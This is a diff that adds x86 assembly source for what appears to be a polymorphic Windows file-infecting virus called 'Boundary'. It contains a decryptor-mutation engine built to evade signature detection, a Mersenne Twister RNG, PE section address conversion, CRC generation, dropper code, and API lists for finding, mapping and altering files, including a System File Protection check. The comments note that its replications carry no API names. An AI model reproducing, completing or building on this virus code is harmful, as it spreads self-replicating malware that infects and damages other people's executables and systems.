+;-----------------------------------------------------------------------------
+;if no register locked
+;-----------------------------------------------------------------------------
+
+        cmp     byte ptr [esi + locked], 0ffh
+        jne     check_prevop
+
+get_lockedreg   label   near
+        call    ebp
+        and     eax, 7
+        cmp     al, REG_ESP
+        je      get_lockedreg
+        mov     byte ptr [esi + locked], al
+        xchg    ebx, eax
+
+get_codebits    label   near
+        call    ebp
+
+codesize_patch  label   near
+        and     eax, 'rgb!'
+        cmp     eax, CODESIZE
+        jnb     get_codebits
+        shr     eax, 2
+        bts     dword ptr [esi + codebits], eax
+        jb      get_codebits
+        shl     eax, 2
+        mov     ecx, dword ptr [esi + stacked]
+        mov     dword ptr [ecx * 4 + esi + stack], eax
+        mov     eax, dword ptr [ebp + eax + offset boundary_inf - offset random]
+        call    adjust_val
+
+jmp_poly2       label   near
+        jmp     do_poly2
+
+check_prevop    label   near
+        cmp     byte ptr [esi + prev_op], bl ;OP_ADD
+        jne     do_poly2
+        mov     ch, al
+        mov     cl, byte ptr [esi + locked]
+        test    al, al
+        je      make_move
+        call    ebp
+        and     al, 7
+        mov     cl, al
+
+make_move       label   near
+        mov     ax, 3091h
+        add     ah, cl
+        rol     ax, 3
+        stos    word ptr [edi]
+
+;-----------------------------------------------------------------------------
+;randomly pick one register to combine with ESP, with random scale
+;-----------------------------------------------------------------------------
+
+        call    ebp
+        and     al, 0f8h
+        or      al, REG_ESP
+        stos    byte ptr [edi]
+        mov     cl, al
+        shr     al, 3
+        and     eax, 7
+        cmp     al, 4
+        je      skip_pushscale
+        mov     ebx, dword ptr [eax * 4 + esi + vals]
+        shr     cl, 6
+        shl     ebx, cl
+
+skip_pushscale  label   near
+        add     ebx, dword ptr [esi + esp_delta]
+        neg     ebx
+        xchg    ebx, eax
+        stos    dword ptr [edi]
+        test    ch, ch
+        jne     do_poly2
+        mov     byte ptr [esi + locked], 0ffh
+        dec     byte ptr [esi + donesub]
+        inc     dword ptr [esi + stacked]
+        dec     edx
+
+do_poly2        label   near
+        call    ebp
+        and     eax, 7
+        inc     eax
+        xchg    ecx, eax
+
+loop_poly2      label   near
+        call    poly
+        loop    loop_poly2
+        jmp     decryptor
+make_decrypt    endp
+
+poly            proc    near
+        pushad
+        pop     edx                     ;discard edi
+        push    ebp
+
+get_polyreg     label   near
+
+;-----------------------------------------------------------------------------
+;avoid the locked register
+;-----------------------------------------------------------------------------
+
+        call    ebp
+        and     eax, 7
+        cmp     byte ptr [esi + locked], al
+        je      get_polyreg
+        xchg    ebx, eax
+
+poly_op         label   near
+
+;-----------------------------------------------------------------------------
+;avoid ADC/SBB if carry is not known, unless register is completely unknown
+;-----------------------------------------------------------------------------
+
+        call    ebp
+        and     al, 38h
+        jecxz   poly_random
+        cmp     al, OP_ADC
+        je      poly_carry
+        cmp     al, OP_SBB
+        jne     poly_random
+
+poly_carry      label   near
+        cmp     byte ptr [esi + known_carry], bh
+        jne     poly_random
+        cmp     dword ptr [ebx * 4 + esi + unknown], -1
+        jne     poly_op
+
+poly_random     label   near
+        xchg    edx, eax
+        call    ebp
+        xchg    ebp, eax
+        cmp     bl, REG_ESP
+        jne     poly_store
+        mov     eax, dword ptr [esi + esp_delta]
+        cmp     dl, OP_OR
+        jne     poly_tryand
+
+;-----------------------------------------------------------------------------
+;or esp, 0-3 (if original value, else or esp, 0)
+;-----------------------------------------------------------------------------
+
+        cmp     eax, 1
+        sbb     eax, eax
+        and     eax, 3
+        and     ebp, eax
+        jecxz   poly_store
+        add     dword ptr [esi + esp_delta], ebp
+        jmp     poly_store
+
+poly_tryand     label   near
+        cmp     dl, OP_AND
+        jne     poly_trycmp
+
+;-----------------------------------------------------------------------------
+;and esp, fffffffc-ffffffff (if original value, else and esp, ffffffff)
+;-----------------------------------------------------------------------------
+
+        cmp     eax, 1
+        cmc
+        sbb     eax, eax
+        or      eax, -4
+        or      ebp, eax
+        jecxz   poly_store
+        and     dword ptr [esi + esp_delta], ebp
+        jmp     poly_store
+
+poly_trycmp     label   near
+
+;-----------------------------------------------------------------------------
+;operation is new if delta is 0, or if switching to or from XOR
+;(allow all ADD/SUBs or XORs to combine)
+;-----------------------------------------------------------------------------
+
+        cmp     dl, OP_CMP
+        je      poly_store
+        test    eax, eax
+        je      poly_prevop
+        mov     dh, byte ptr [esi + prev_op]
+        cmp     dh, dl
+        je      poly_store
+        cmp     dh, OP_XOR
+        je      poly_revert
+        cmp     dl, OP_XOR
+        jne     poly_store
+
+poly_revert     label   near
+
+;-----------------------------------------------------------------------------
+;revert ESP and allow future changes
+;-----------------------------------------------------------------------------
+
+        xchg    ebp, eax
+        mov     dl, dh
+        cmp     dh, OP_XOR
+        je      poly_store
+        mov     dl, OP_SUB
+        call    dword ptr [esp]
+        test    al, 1
+        je      poly_adcsbb
+
+;-----------------------------------------------------------------------------
+;randomly SUB->ADD
+;-----------------------------------------------------------------------------
+
+        xor     dl, dl
+        neg     ebp
+
+poly_adcsbb     label   near
+        cmp     byte ptr [esi + known_carry], bh
+        je      poly_prevop
+        call    dword ptr [esp]
+        and     al, 8
+        je      poly_prevop
+
+;-----------------------------------------------------------------------------
+;randomly ADC/SBB if carry is known
+;-----------------------------------------------------------------------------
+
+        and     dl, al
+        add     dl, 10h
+        sub     ebp, dword ptr [esi + carry]
+
+poly_prevop     label   near
+        mov     byte ptr [esi + prev_op], dl
+
+poly_store      label   near
+        mov     ax, 0c081h
+        add     ah, bl
+        add     ah, dl
+        stos    word ptr [edi]
+        xchg    ebp, eax
+        stos    dword ptr [edi]
+        xchg    edx, eax
+        xor     ah, ah
+        mov     ebp, dword ptr [ebx * 4 + esi + vals]
+        test    al, al ;cmp al, OP_ADD
+        je      poly_add
+        cmp     al, OP_ADC
+        jne     poly_trysub
+        add     edx, dword ptr [esi + carry]
+        cmp     bl, REG_ESP
+        jne     poly_add
+        mov     byte ptr [esi + prev_op], bh ;OP_ADD
+
+poly_add        label   near
+        add     dword ptr [ebx * 4 + esi + vals], edx
+
+;-----------------------------------------------------------------------------
+;if all bits are known, carry can be determined exactly
+;-----------------------------------------------------------------------------
+
+        cmp     dword ptr [ebx * 4 + esi + unknown], 0
+        jne     poly_addesp
+        mov     ah, 1
+        cmp     dword ptr [ebx * 4 + esi + vals], ebp
+        setb    al
+
+poly_addesp     label   near
+
+;-----------------------------------------------------------------------------
+;disable ESP undo when in random mode
+;-----------------------------------------------------------------------------
+
+        jecxz   poly_jmpret
+        cmp     bl, REG_ESP
+        jne     poly_ret
+        add     dword ptr [esi + esp_delta], edx
+
+poly_jmpret     label   near
+        jmp     poly_ret
+
+poly_trysub     label   near
+        cmp     al, OP_SUB
+        je      poly_sub
+        cmp     al, OP_SBB
+        jne     poly_or
+        add     edx, dword ptr [esi + carry]
+
+poly_sub        label   near
+        sub     dword ptr [ebx * 4 + esi + vals], edx
+
+;-----------------------------------------------------------------------------
+;if all bits are known, carry can be determined exactly
+;-----------------------------------------------------------------------------
+
+        cmp     dword ptr [ebx * 4 + esi + unknown], 0
+        jne     poly_subesp
+        mov     ah, 1
+        cmp     dword ptr [ebx * 4 + esi + vals], ebp
+        setnbe  al
+
+poly_subesp     label   near
+
+;-----------------------------------------------------------------------------
+;disable ESP undo when in random mode
+;-----------------------------------------------------------------------------
+
+        jecxz   poly_ret
+        cmp     bl, REG_ESP
+        jne     poly_ret
+        mov     byte ptr [esi + prev_op], bh ;OP_ADD
+        sub     dword ptr [esi + esp_delta], edx
+        jmp     poly_ret
+
+poly_or         label   near
+        cmp     al, OP_OR
+        jne     poly_and
+        or      dword ptr [ebx * 4 + esi + vals], edx
+
+;-----------------------------------------------------------------------------
+;all set bits become known
+;-----------------------------------------------------------------------------
+
+        not     edx
+        jmp     poly_unknown
+
+poly_and        label   near
+        cmp     al, OP_AND
+        jne     poly_xor
+        and     dword ptr [ebx * 4 + esi + vals], edx
+
+;-----------------------------------------------------------------------------
+;all clear bits become known
+;-----------------------------------------------------------------------------
+
+poly_unknown    label   near
+        and     dword ptr [ebx * 4 + esi + unknown], edx
+        jmp     poly_known
+
+poly_xor        label   near
+        cmp     al, OP_XOR
+        jne     poly_cmp
+        xor     dword ptr [ebx * 4 + esi + vals], edx
+
+;-----------------------------------------------------------------------------
+;disable ESP undo when in random mode
+;-----------------------------------------------------------------------------
+
+        jecxz   poly_known
+        cmp     bl, REG_ESP
+        jne     poly_known
+        xor     dword ptr [esi + esp_delta], edx
+
+poly_known      label   near
+        xor     al, al
+        jmp     poly_setcarry
+
+poly_cmp        label   near
+
+;-----------------------------------------------------------------------------
+;if all bits are known, carry can be determined exactly
+;if top bit is known and different, carry can be guessed
+;-----------------------------------------------------------------------------
+
+        mov     ecx, dword ptr [ebx * 4 + esi + unknown]
+        jecxz   poly_cmpset
+        test    ecx, ecx
+        js      poly_ret
+        xor     ebp, edx
+        jns     poly_ret
+        xor     ebp, edx
+
+poly_cmpset     label   near
+        cmp     ebp, edx
+        setb    al
+
+poly_setcarry   label   near
+        mov     ah, 1
+
+poly_ret        label   near
+        xchg    ah, al
+        mov     word ptr [esi + known_carry], ax
+        pop     eax
+        push    edi
+        popad
+        ret
+poly            endp
+
+;-----------------------------------------------------------------------------
+;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura
+;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence
+;asm port and size optimise by rgb in 2002
+;-----------------------------------------------------------------------------
+
+randinit        proc    near                    ;eax = seed, ecx = 0, edi -> RNG cache
+        pushad
+        push    edi
+        or      eax, 1
+        mov     ecx, statelen
+
+init_loop       label   near
+        stos    dword ptr [edi]
+        mov     edx, 69069
+        mul     edx                             ;Knuth: x_new = x_old * 69069
+        loop    init_loop
+        inc     ecx                             ;force reload
+        call    initdelta
+
+initdelta       label   near
+        pop     edi
+        add     edi, offset randvars - offset initdelta
+        xchg    ecx, eax
+        stos    dword ptr [edi]
+        pop     eax
+        stos    dword ptr [edi]
+        stos    dword ptr [edi]
+        popad
+        ret
+randinit        endp
+
+random          proc    near
+        pushad
+        call    randelta
+
+randvars        label   near
+        db      'rgb!'                          ;numbers left
+        db      'rgb!'                          ;next pointer
+        db      'rgb!'                          ;state pointer
+
+randelta        label   near
+        pop     esi
+        push    esi
+        lods    dword ptr [esi]
+        xchg    ecx, eax
+        lods    dword ptr [esi]
+        xchg    esi, eax
+        loop    random_ret
+        mov     cx, statelen - period
+        mov     esi, dword ptr [eax]
+        lea     ebx, dword ptr [esi + (period * 4)]
+        mov     edi, esi
+        push    esi
+        lods    dword ptr [esi]
+        xchg    edx, eax
+        call    twist
+        pop     ebx
+        mov     cx, period - 1
+        push    ecx
+        push    ebx
+        call    twist
+        pop     esi
+        push    esi
+        inc     ecx
+        call    twist
+        xchg    edx, eax
+        pop     esi
+        pop     ecx
+        inc     ecx
+
+random_ret      label   near
+        lods    dword ptr [esi]
+        mov     edx, eax
+        shr     eax, tshiftU
+        xor     eax, edx
+        mov     edx, eax
+        shl     eax, tshiftS
+        and     eax, tmaskB
+        xor     eax, edx
+        mov     edx, eax
+        shl     eax, tshiftT
+        and     eax, tmaskC
+        xor     eax, edx
+        mov     edx, eax
+        shr     eax, tshiftL
+        xor     eax, edx
+        pop     edi
+        mov     dword ptr [esp + 1ch], eax      ;eax in pushad
+        xchg    ecx, eax
+        stos    dword ptr [edi]
+        xchg    esi, eax
+        stos    dword ptr [edi]
+        popad
+        ret
+random          endp
+
+twist           proc    near
+        lods    dword ptr [esi]
+        push    eax
+        add     eax, eax                        ;remove highest bit
+        add     edx, edx                        ;test highest bit
+        rcr     eax, 2                          ;merge bits and test lowest bit
+        jnb     twist_skip                      ;remove branch but larger using:
+        xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx
+
+twist_skip      label   near
+        xor     eax, dword ptr [ebx]
+        add     ebx, 4
+        stos    dword ptr [edi]
+        pop     edx
+        loop    twist
+        ret
+twist           endp
+
+adjust_val      proc    near
+        pushad
+        pop     edx ;discard edi
+        mov     ecx, eax
+        xchg    dword ptr [ebx * 4 + esi + vals], eax
+        xchg    ebp, eax
+        xchg    edx, eax
+
+adjust_op       label   near
+
+;-----------------------------------------------------------------------------
+;avoid unusable instructions, including XOR if register is ESP, and ADC/SBB if carry is not known
+;-----------------------------------------------------------------------------
+
+        call    edx
+        and     al, 38h
+        cmp     al, OP_OR
+        je      adjust_op
+        cmp     al, OP_AND
+        je      adjust_op
+        cmp     al, OP_CMP
+        je      adjust_op
+        cmp     al, OP_XOR
+        jne     check_adcsbb
+        cmp     bl, REG_ESP
+        jmp     loop_adjust
+
+check_adcsbb    label   near
+        cmp     al, OP_ADC
+        je      adjust_carry
+        cmp     al, OP_SBB
+        jne     do_adjust
+
+adjust_carry    label   near
+        cmp     byte ptr [esi + known_carry], bh
+
+loop_adjust     label   near
+        je      adjust_op
+
+do_adjust       label   near
+        xor     edx, edx
+        test    al, al ;cmp al, OP_ADD
+        je      adjust_add
+        cmp     al, OP_ADC
+        jne     adjust_trysub
+        sub     ecx, dword ptr [esi + carry]
+
+adjust_add      label   near
+        cmp     bl, REG_ESP
+        je      adjust_adc
+        inc     edx
+        cmp     ecx, ebp
+        setb    dh
+
+adjust_adc      label   near
+        sub     ecx, ebp
+        jmp     store_adjust
+
+adjust_trysub   label   near
+        cmp     al, OP_SUB
+        je      adjust_sub
+        cmp     al, OP_SBB
+        jne     adjust_xor
+        add     ecx, dword ptr [esi + carry]
+
+adjust_sub      label   near
+        cmp     bl, REG_ESP
+        je      adjust_sbb
+        inc     edx
+        cmp     ecx, ebp
+        setnbe  dh
+
+adjust_sbb      label   near
+        neg     ecx
+        add     ecx, ebp
+        jmp     store_adjust
+
+adjust_xor      label   near
+        inc     edx
+        xor     ecx, ebp
+
+store_adjust    label   near
+        mov     dword ptr [esi + known_carry], edx
+        add     al, 0c0h
+        add     al, bl
+        mov     ah, 81h
+        xchg    al, ah
+        stos    word ptr [edi]
+        xchg    ecx, eax
+        stos    dword ptr [edi]
+        push    edi
+        popad
+        ret
+adjust_val      endp
+
+;-----------------------------------------------------------------------------
+;convert relative virtual address to raw file offset
+;-----------------------------------------------------------------------------
+
+rvaloop         label   near
+        sub     esi, size pesect
+        cmp     al, 'R'                         ;mask PUSH ESI
+        org     $ - 1
+rva2raw         proc    near                    ;ecx = RVA, esi -> last section header
+        push    esi
+        cmp     dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr], ecx
+        jnbe    rvaloop
+        sub     ecx, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
+        add     ecx, dword ptr [esi]
+        pop     esi
+        ret
+rva2raw         endp
+
+align   4
+hostva          dd      ?
+align
+boundary_codeend label   near
+
+create_crcs     proc    near
+        or      eax, -1
+
+create_outer    label   near
+        xor     al, byte ptr [ebx]
+        push    8
+        pop     ecx
+
+create_inner    label   near
+        add     eax, eax
+        jnb     create_skip
+        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)
+
+create_skip     label   near
+        loop    create_inner
+        sub     cl, byte ptr [ebx]              ;carry set if not zero
+        inc     ebx                             ;carry not altered by inc
+        jb      create_outer
+        stos    dword ptr [edi]
+        dec     edx
+        jne     create_crcs
+        ret
+create_crcs     endp
+
+do_message      label   near
+        xor     eax, eax
+        push    eax
+        push    offset txttitle
+        push    offset txtbody
+        push    eax
+        call    MessageBoxA
+        push    eax
+        call    ExitProcess
+
+;must be alphabetical order
+;API names are not present in replications, only in dropper
+
+krnnames        db      "CloseHandle"         , 0
+                db      "CreateFileA"         , 0
+                db      "CreateFileMappingA"  , 0
+                db      "CreateFileW"         , 0
+                db      "ExitProcess"         , 0
+                db      "FindClose"           , 0
+                db      "FindFirstFileA"      , 0
+                db      "FindFirstFileW"      , 0
+                db      "FindNextFileA"       , 0
+                db      "FindNextFileW"       , 0
+                db      "GetFullPathNameA"    , 0
+                db      "GetFullPathNameW"    , 0
+                db      "GetTickCount"        , 0
+                db      "GetVersion"          , 0
+                db      "GlobalAlloc"         , 0
+                db      "GlobalFree"          , 0
+                db      "LoadLibraryA"        , 0
+                db      "MapViewOfFile"       , 0
+                db      "MultiByteToWideChar" , 0
+                db      "SetCurrentDirectoryA", 0
+                db      "SetCurrentDirectoryW", 0
+                db      "SetFileAttributesA"  , 0
+                db      "SetFileAttributesW"  , 0
+                db      "SetFileTime"         , 0
+                db      "UnmapViewOfFile"     , 0
+                db      "VirtualAlloc"        , 0
+                db      "VirtualFree"         , 0
+
+sfcnames        db      "SfcIsFileProtected", 0
+
+txttitle        db      "Boundary", 0
+txtbody         db      "running...", 0
+
+.code
+        nop
+end             dropper
